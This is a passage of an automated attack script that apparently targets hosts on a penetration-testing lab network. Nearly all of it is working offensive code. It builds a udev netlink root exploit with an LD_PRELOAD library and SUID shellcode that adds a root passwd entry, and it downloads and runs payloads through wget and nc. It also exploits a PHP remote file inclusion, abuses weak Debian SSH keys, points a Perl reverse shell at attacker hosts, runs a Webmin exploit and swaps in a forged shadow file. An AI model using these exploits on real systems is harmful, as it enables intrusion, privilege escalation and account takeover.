                           echo -e "\n#define SHORT_STRING 64\n#define MEDIUM_STRING 128\n#define BIG_STRING 256\n#define LONG_STRING 1024\n#define EXTRALONG_STRING 4096\n#define TRUE 1\n#define FALSE 0" >> /var/www/pain/udev.c
                           echo -e "\nint socket_fd;\nstruct sockaddr_nl address;\nstruct msghdr msg;\nstruct iovec iovector;\nint sz = 64*1024;" >> /var/www/pain/udev.c
                           echo -e "\nmain(int argc, char **argv) {\n\tchar sysfspath[SHORT_STRING];\n\tchar subsystem[SHORT_STRING];\n\tchar event[SHORT_STRING];\n\tchar major[SHORT_STRING];\n\tchar minor[SHORT_STRING];" >> /var/www/pain/udev.c
                           echo -e '\n\tsprintf(event, "add");\n\tsprintf(subsystem, "block");\n\tsprintf(sysfspath, "/dev/foo");\n\tsprintf(major, "8");\n\tsprintf(minor, "1");' >> /var/www/pain/udev.c
                           echo -e "\n\n\tmemset(&address, 0, sizeof(address));\n\taddress.nl_family = AF_NETLINK;\n\taddress.nl_pid = atoi(argv[1]);\n\taddress.nl_groups = 0;" >> /var/www/pain/udev.c
                           echo -e "\n\n\tmsg.msg_name = (void*)&address;\n\tmsg.msg_namelen = sizeof(address);\n\tmsg.msg_iov = &iovector;\n\tmsg.msg_iovlen = 1;" >> /var/www/pain/udev.c
                           echo -e "\n\n\tsocket_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);\n\tbind(socket_fd, (struct sockaddr *) &address, sizeof(address));" >> /var/www/pain/udev.c
                           echo -e "\n\n\tchar message[LONG_STRING];\n\tchar *mp;" >> /var/www/pain/udev.c
                           echo -e '\n\n\tmp = message;\n\tmp += sprintf(mp, "%s@%s", event, sysfspath) +1;\n\tmp += sprintf(mp, "ACTION=%s", event) +1;\n\tmp += sprintf(mp, "DEVPATH=%s", sysfspath) +1;\n\tmp += sprintf(mp, "MAJOR=%s", major) +1;\n\tmp += sprintf(mp, "MINOR=%s", minor) +1;\n\tmp += sprintf(mp, "SUBSYSTEM=%s", subsystem) +1;\n\tmp += sprintf(mp, "LD_PRELOAD=/tmp/libno_ex.so.1.0") +1;' >> /var/www/pain/udev.c
                           echo -e "\n\n\tiovector.iov_base = (void*)message;\n\tiovector.iov_len = (int)(mp-message);" >> /var/www/pain/udev.c
                           echo -e '\n\n\tchar *buf;\n\tint buflen;\n\tbuf = (char *) &msg;\n\tbuflen = (int)(mp-message);\n\tsendmsg(socket_fd, &msg, 0);\n\n\tclose(socket_fd);\n\n\tsleep(10);\n\texecl("/tmp/suid", "suid", (void*)0);\n}' >> /var/www/pain/udev.c

                           gcc -w /var/www/pain/udev.c -o /var/www/pain/udev
                          fi

# make libno_ex.so.1.0

                          if [ ! -f /var/www/pain/program.c ];then

                           echo -e '#include <unistd.h>\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\n' > /var/www/pain/program.c
                           echo -e 'void _init()\n{\n setgid(0);\n setuid(0);\n unsetenv("LD_PRELOAD");\n execl("/bin/sh","sh","-c","chown root:root /tmp/suid; chmod +s /tmp/suid",NULL);\n}' >> /var/www/pain/program.c

                           gcc -o /var/www/pain/program.o -c /var/www/pain/program.c -fPIC
                           gcc -shared -Wl,-soname,libno_ex.so.1 -o /var/www/pain/libno_ex.so.1.0 /var/www/pain/program.o -nostartfiles
                          
                          fi

# make suid

                           if [ ! -f /var/www/pain/suid.c ];then
                            echo -e '#include <stdio.h>\n\nchar shellcode[] =\n\n"\\x31\\xc9\\x89\\xcb\\x6a\\x46\\x58\\xcd\\x80\\x6a\\x05\\x58\\x31\\xc9\\x51"\n"\\x68\\x73\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63"\n"\\x89\\xe3\\x41\\xb5\\x04\\xcd\\x80\\x93\\xe8\\x21\\x00\\x00\\x00\\x73\\x75"\n"\\x62\\x3a\\x41\\x7a\\x67\\x7a\\x4c\\x35\\x50\\x4a\\x4a\\x64\\x77\\x73\\x36"\n"\\x3a\\x30\\x3a\\x30\\x3a\\x3a\\x2f\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68"\n"\\x0a\\x59\\x8b\\x51\\xfc\\x6a\\x04\\x58\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80";\n\nint main(void)\n\n{\n\tfprintf(stdout,"[*] Shellcode length: %d\\n",strlen(shellcode));\n\t((void(*)(void)) shellcode)();\n\n\treturn 0;\n}\n' > /var/www/pain/suid.c
                            gcc -o /var/www/pain/suid -w /var/www/pain/suid.c
                           fi

# stop php on apache 

                          if [ "`netstat -ant | grep "0.0.0.0:80" | tr -s " " | cut -d " " -f6`" == "LISTEN" ]; then
                           apache2ctl stop
                           sleep 1
                           a2dismod php5
                           sleep 1
                           apache2ctl start
                          fi
                          if [ "`netstat -ant | grep "0.0.0.0:80" | tr -s " " | cut -d " " -f6`" != "LISTEN" ]; then
                           a2dismod php5
                           sleep 1
                           apache2ctl start
                          fi

# start exploitation for pain

                          if [ $uip == "10.10.11.235" ]; then

                           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Pain command and control shell' -e "echo -e 'wget http://10.10.10.12/pain/udev -O /tmp/udev && wget http://10.10.10.12/pain/suid -O /tmp/suid && wget http://10.10.10.12/pain/libno_ex.so.1.0 -O /tmp/libno_ex.so.1.0 && chmod 777 /tmp/udev && chmod 777 /tmp/suid && chmod 777 /tmp/libno_ex.so.1.0 && /tmp/udev 398' | nc -lvp 5432" & 
                           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Pain wget RFI' -e "wget http://10.10.11.235/section.php?page=http://10.10.10.12/pain/pain11.txt? && rm -rf ./section*" &
                           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Pain r00t shell' -e "sleep 90 && expect -c 'spawn ssh -o StrictHostKeyChecking=no USER@10.10.11.235 ; sleep 60 ; expect password ; send \"bus\n\" ; interact'" &
                           sleep 40
                           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Pain r00t shell' -e ps -A xf | grep "section.php" | grep -v "grep" | grep "xterm" | cut -d" " -f1 | xargs kill -9 && ps -A xf | grep "\/tmp\/udev" | grep -v "grep" | grep "xterm" | cut -d" " -f1 | xargs kill -9
                           apache2ctl stop
                           sleep 1
                           a2enmod php5
                           sleep 1
                           apache2ctl start
                          fi

                          if [ $uip == "10.10.13.235" ]; then

                           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Pain command and control shell' -e "echo -e 'wget http://10.10.12.10/pain/udev -O /tmp/udev && wget http://10.10.12.10/pain/suid -O /tmp/suid && wget http://10.10.12.10/pain/libno_ex.so.1.0 -O /tmp/libno_ex.so.1.0 && chmod 777 /tmp/udev && chmod 777 /tmp/suid && chmod 777 /tmp/libno_ex.so.1.0 && /tmp/udev 398' | nc -lvp 5432" & 
                           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Pain wget RFI' -e "wget http://10.10.13.235/section.php?page=http://10.10.12.10/pain/pain13.txt? && rm -rf ./section*" &
                           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Pain r00t shell' -e "sleep 90 && expect -c 'spawn ssh -o StrictHostKeyChecking=no USER@10.10.13.235 ; sleep 60 ; expect password ; send \"bus\n\" ; interact'" &
                           sleep 40
                           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Kill the pain' -e ps -A xf | grep "section.php" | grep -v "grep" | grep "xterm" | cut -d" " -f1 | xargs kill -9 && ps -A xf | grep "\/tmp\/udev" | grep -v "grep" | grep "xterm" | cut -d" " -f1 | xargs kill -9
                           apache2ctl stop
                           sleep 1
                           a2enmod php5
                           sleep 1
                           apache2ctl start
                          fi

                          if [ $uip == "10.10.15.235" ]; then
                           
                           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Pain command and control shell' -e "echo -e 'wget http://10.10.14.10/pain/udev -O /tmp/udev && wget http://10.10.14.10/pain/suid -O /tmp/suid && wget http://10.10.14.10/pain/libno_ex.so.1.0 -O /tmp/libno_ex.so.1.0 && chmod 777 /tmp/udev && chmod 777 /tmp/suid && chmod 777 /tmp/libno_ex.so.1.0 && /tmp/udev 398' | nc -lvp 5432" & 
                           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Pain wget RFI' -e "wget http://10.10.15.235/section.php?page=http://10.10.14.10/pain/pain15.txt? && rm -rf ./section*" &
                           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Pain r00t shell' -e "sleep 90 && expect -c 'spawn ssh -o StrictHostKeyChecking=no USER@10.10.15.235 ; sleep 60 ; expect password ; send \"bus\n\" ; interact'" &
                           sleep 40
                           xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Pain r00t shell' -e ps -A xf | grep "section.php" | grep -v "grep" | grep "xterm" | cut -d" " -f1 | xargs kill -9 && ps -A xf | grep "\/tmp\/udev" | grep -v "grep" | grep "xterm" | cut -d" " -f1 | xargs kill -9
                           apache2ctl stop
                           sleep 1
                           a2enmod php5
                           sleep 1
                           apache2ctl start
                          fi

                         else

                          if [ `echo $uip | cut -d"." -f4` == "236" ]; then

# check if expect is installed

                           if [ "`locate expect | grep "/usr/bin/" | cut -d"/" -f4`" != "expect" ];then
                             echo -e "\n\n\t[*] Non expect found - Updating db, please wait ....."
                             updatedb
                           fi

                           if [ "`locate expect | grep "/usr/bin/" | cut -d"/" -f4`" != "expect" ];then
                            apt-get update
                            apt-get install expect                          
                            updatedb
                           fi

# make the sufference dir structure                         
                          
                           if [ ! -d /var/www/suffer ];then
                            mkdir /var/www/suffer
                           fi
                        
# get the dsa 1024 files and make the dir as needed to ssh ans scp

                           if [ ! -d /var/www/suffer/dsa ];then                           
                            cd /var/www/suffer
                            wget digitaloffense.net/tools/debian-openssl/debian_ssh_dsa_1024_x86.tar.bz2
                            tar -jxvf debian_ssh_dsa_1024_x86.tar.bz2
                           fi

# make the local root shellcode

                           if [ ! -f /var/www/suffer/suf.c ];then
                            echo -e '#include <stdio.h>\n\nchar shellcode[] =\n\n"\\x31\\xc9\\x89\\xcb\\x6a\\x46\\x58\\xcd\\x80\\x6a\\x05\\x58\\x31\\xc9\\x51"\n"\\x68\\x73\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63"\n"\\x89\\xe3\\x41\\xb5\\x04\\xcd\\x80\\x93\\xe8\\x21\\x00\\x00\\x00\\x73\\x75"\n"\\x62\\x3a\\x41\\x7a\\x67\\x7a\\x4c\\x35\\x50\\x4a\\x4a\\x64\\x77\\x73\\x36"\n"\\x3a\\x30\\x3a\\x30\\x3a\\x3a\\x2f\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68"\n"\\x0a\\x59\\x8b\\x51\\xfc\\x6a\\x04\\x58\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80";\n\nint main(void)\n\n{\n\tfprintf(stdout,"[*] Shellcode length: %d\\n",strlen(shellcode));\n\t((void(*)(void)) shellcode)();\n\n\treturn 0;\n}\n' > /var/www/suffer/suf.c
                           fi

# compile sufferance local root exploit to replace scp

                           if [ ! -f /var/www/suffer/scp ];then
                            gcc -w /var/www/suffer/suf.c -o /var/www/suffer/scp
                           fi

# make the helper script

                           if [ ! -f /var/www/suffer/helper.sh ];then
                            echo -e '#!/bin/bash\n\nchmod 777 ./scp\nexport PATH=/home/bob:$PATH\nuploadtosecure\n' >/var/www/suffer/helper.sh
                           fi

# start the exploitation process

                           if [ $uip == "10.10.11.236" ]; then
                          
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Upload scp to sufference' -e "scp -o StrictHostKeyChecking=no -i /var/www/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 /var/www/suffer/scp bob@10.10.11.236:~/" &
                            sleep 3
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Upload helper.sh script to sufference' -e "scp -o StrictHostKeyChecking=no -i /var/www/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 /var/www/suffer/helper.sh bob@10.10.11.236:~/" &
                            sleep 3
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'chmod the helper script' -e "ssh -o StrictHostKeyChecking=no -i /var/www/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 -l bob 10.10.11.236 chmod 777 ./helper.sh" &
                            sleep 3
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Launch helper script' -e "ssh -o StrictHostKeyChecking=no -i /var/www/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 -l bob 10.10.11.236 ./helper.sh" &
                            sleep 3
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Launch expect shell' -e expect -c 'spawn ssh -o StrictHostKeyChecking=no USER@10.10.11.236 ; expect password ; send "bus\n" ; interact' 
                           
                           fi

                           if [ $uip == "10.10.13.236" ]; then
                          
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Upload scp to sufference' -e "scp -o StrictHostKeyChecking=no -i /var/www/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 /var/www/suffer/scp bob@10.10.13.236:~/" &
                            sleep 3
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Upload helper.sh script to sufference' -e "scp -o StrictHostKeyChecking=no -i /var/www/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 /var/www/suffer/helper.sh bob@10.10.13.236:~/" &
                            sleep 3
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'chmod the helper script' -e "ssh -o StrictHostKeyChecking=no -i /var/www/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 -l bob 10.10.13.236 chmod 777 ./helper.sh" &
                            sleep 3
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Launch helper script' -e "ssh -o StrictHostKeyChecking=no -i /var/www/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 -l bob 10.10.13.236 ./helper.sh" &
                            sleep 3
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Launch expect shell' -e expect -c 'spawn ssh -o StrictHostKeyChecking=no USER@10.10.13.236 ; expect password ; send "bus\n" ; interact' 
                           
                           fi

                           if [ $uip == "10.10.15.236" ]; then
                          
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Upload scp to sufference' -e "scp -o StrictHostKeyChecking=no -i /var/www/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 /var/www/suffer/scp bob@10.10.15.236:~/" &
                            sleep 3
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Upload helper.sh script to sufference' -e "scp -o StrictHostKeyChecking=no -i /var/www/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 /var/www/suffer/helper.sh bob@10.10.15.236:~/" &
                            sleep 3
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'chmod the helper script' -e "ssh -o StrictHostKeyChecking=no -i /var/www/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 -l bob 10.10.15.236 chmod 777 ./helper.sh" &
                            sleep 3
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Launch helper script' -e "ssh -o StrictHostKeyChecking=no -i /var/www/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 -l bob 10.10.15.236 ./helper.sh" &
                            sleep 3
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Launch expect shell' -e expect -c 'spawn ssh -o StrictHostKeyChecking=no USER@10.10.15.236 ; expect password ; send "bus\n" ; interact' 
                            
                           fi

                          else

                           if [ `echo $uip | cut -d"." -f4` == "241" ]; then

# fc4 dir structure

                            if [ ! -d /var/www/fc4 ];then
                             mkdir /var/www/fc4
                            fi

# fc4 perl reverse shell

                            if [ ! -f /var/www/fc4/perl-reverse-shell-1.0.tar.gz ];then
                             cd /var/www/fc4
                             wget http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz
                             tar -zxvf /var/www/fc4/perl-reverse-shell-1.0.tar.gz
                            fi

# fc4 perl to cgi shell file for testing

                            if [ ! -f /var/www/fc4/fc411.cgi ]; then
                             cat /var/www/fc4/perl-reverse-shell-1.0/perl-reverse-shell.pl |\
                             sed -r "s/ip \= '127.0.0.1'\;/ip \= '10.10.10.12'\;/g" |\
                             sed -r "s/port \= 1234\;/port \= 4321\;/g" > /var/www/fc4/fc411.cgi
                            fi

                            if [ ! -f /var/www/fc4/fc413.cgi ]; then
                             cat /var/www/fc4/perl-reverse-shell-1.0/perl-reverse-shell.pl |\
                             sed -r "s/ip \= '127.0.0.1'\;/ip \= '10.10.12.10'\;/g" |\
                             sed -r "s/port \= 1234\;/port \= 4321\;/g" > /var/www/fc4/fc413.cgi
                            fi

                            if [ ! -f /var/www/fc4/fc415.cgi ]; then 
                             cat /var/www/fc4/perl-reverse-shell-1.0/perl-reverse-shell.pl |\
                             sed -r "s/ip \= '127.0.0.1'\;/ip \= '10.10.14.10'\;/g" |\
                             sed -r "s/port \= 1234\;/port \= 4321\;/g" > /var/www/fc4/fc415.cgi
                            fi

# make the evil.cgi

                            if [ ! -f /var/www/fc4/evil11.cgi ]; then 
                             echo -e '#!/usr/bin/perl\nuse File::Copy;\n$oldlocation = "/etc/shadow-";\n$newlocation = "/etc/shadow-.old";\nmove($oldlocation, $newlocation);\n$oldlocation = "/etc/shadow";\n$newlocation = "/etc/shadow.old";\nmove($oldlocation, $newlocation);\n$evilshadows = "/home/alice/shadow";\nmove($evilshadows, $oldlocation);' > /var/www/fc4/evil11.cgi
                            fi
                            if [ ! -f /var/www/fc4/evil13.cgi ]; then 
                             echo -e '#!/usr/bin/perl\nuse File::Copy;\n$oldlocation = "/etc/shadow-";\n$newlocation = "/etc/shadow-.old";\nmove($oldlocation, $newlocation);\n$oldlocation = "/etc/shadow";\n$newlocation = "/etc/shadow.old";\nmove($oldlocation, $newlocation);\n$evilshadows = "/home/alice/shadow";\nmove($evilshadows, $oldlocation);' > /var/www/fc4/evil13.cgi
                            fi
                            if [ ! -f /var/www/fc4/evil15.cgi ]; then 
                             echo -e '#!/usr/bin/perl\nuse File::Copy;\n$oldlocation = "/etc/shadow-";\n$newlocation = "/etc/shadow-.old";\n$oldlocation = "/etc/shadow";\n$newlocation = "/etc/shadow.old";\nmove($oldlocation, $newlocation);\nmove($oldlocation, $newlocation);\n$evilshadows = "/home/alice/shadow";\nmove($evilshadows, $oldlocation);' > /var/www/fc4/evil15.cgi
                            fi

# make evil/shadow file

                            if [ ! -f /var/www/fc4/evil.shadow ]; then 
                             echo -e 'root:$1$8UpmX7yC$Fytsj3S1Thy/PbliY7Cfj1:14680:0:99999:7:::' > /var/www/fc4/evil.shadow
                             echo -e 'bin:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'daemon:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'adm:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'lp:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'sync:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'shutdown:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'halt:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'mail:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'news:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'uucp:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'operator:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'games:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'gopher:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'ftp:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'nobody:*:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'dbus:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'vcsa:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'rpm:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'haldaemon:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'pcap:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'nscd:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'named:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'netdump:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'sshd:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'rpc:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'mailnull:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'smmsp:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'rpcuser:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'nfsnobody:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'apache:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'squid:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'webalizer:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'xfs:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'ntp:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'mysql:!!:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'bob:$1$g5gebnsY$ioI7NilK5pnXC4vwT7Nqq0:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                             echo -e 'alice:$1$8UpmX7yC$Fytsj3S1Thy/PbliY7Cfj1:13653:0:99999:7:::' >> /var/www/fc4/evil.shadow
                            fi

# start the exploitation process

                            if [ $uip == "10.10.11.241" ]; then
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Reverse shell catcher fc4' -e nc -lvp 4321 &
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Unathenticated shell launch' -e expect -c 'spawn ssh -o StrictHostKeyChecking=no alice@10.10.11.241 wget http://10.10.10.12/fc4/fc411.cgi -O /home/alice/fc411.cgi && chmod 777 ./fc411.cgi; sleep 60 ; expect password ; send "alice\n" ; interact' &
                            sleep 60
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc4 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.11.241 10000 /home/alice/fc411.cgi 0 
                            sleep 5
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc4 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.11.241 10000 /home/alice/fc411.cgi 0 
                            sleep5
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc4 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.11.241 10000 /home/alice/fc411.cgi 0 

                            fi

                            if [ $uip == "10.10.13.241" ]; then
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Reverse shell catcher fc4' -e nc -lvp 4321 &
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Unathenticated shell launch' -e expect -c 'spawn ssh -o StrictHostKeyChecking=no alice@10.10.13.241 wget http://10.10.12.10/fc4/fc413.cgi -O /home/alice/fc413.cgi && chmod 777 ./fc413.cgi; sleep 60 ; expect password ; send "alice\n" ; interact' &
                            sleep 60
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc4 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.13.241 10000 /home/alice/fc413.cgi 0 
                            sleep 5
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc4 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.13.241 10000 /home/alice/fc413.cgi 0 
                            sleep5
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc4 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.13.241 10000 /home/alice/fc413.cgi 0 
                            fi

                            if [ $uip == "10.10.15.241" ]; then
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Reverse shell catcher fc4' -e nc -lvp 4321 &
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Unathenticated shell launch' -e expect -c 'spawn ssh -o StrictHostKeyChecking=no alice@10.10.15.241 wget http://10.10.14.10/fc4/fc415.cgi -O /home/alice/fc415.cgi && chmod 777 ./fc415.cgi; sleep 60 ; expect password ; send "alice\n" ; interact' &
                            sleep 60
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc4 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.15.241 10000 /home/alice/fc415.cgi 0 
                            sleep 5
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc4 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.15.241 10000 /home/alice/fc415.cgi 0 
                            sleep5
                            xterm -bc -bd white -bg black -fg green +l -lf ./mh-log.txt -leftbar -ls -name multihandler -ms yellow -selbg orange -selfg black -title 'Webmin exploit fc4 rev shell' -e perl /pentest/exploits/exploitdb/platforms/multiple/remote/2017.pl 10.10.15.241 10000 /home/alice/fc415.cgi 0 
                            fi

                           else

                            if [ `echo $uip | cut -d"." -f4` == "242" ]; then

# fc4 dir structure

                            if [ ! -d /var/www/fc42 ];then
                             mkdir /var/www/fc42
                            fi

# fc4 perl reverse shell

                            if [ ! -f /var/www/fc42/perl-reverse-shell-1.0.tar.gz ];then
                             cd /var/www/fc42
                             wget http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz
                             tar -zxvf /var/www/fc42/perl-reverse-shell-1.0.tar.gz
                            fi

# fc4 perl to cgi shell file for testing

                            if [ ! -f /var/www/fc42/fc4211.cgi ]; then
                             cat /var/www/fc42/perl-reverse-shell-1.0/perl-reverse-shell.pl |\
                             sed -r "s/ip \= '127.0.0.1'\;/ip \= '10.10.10.12'\;/g" |\
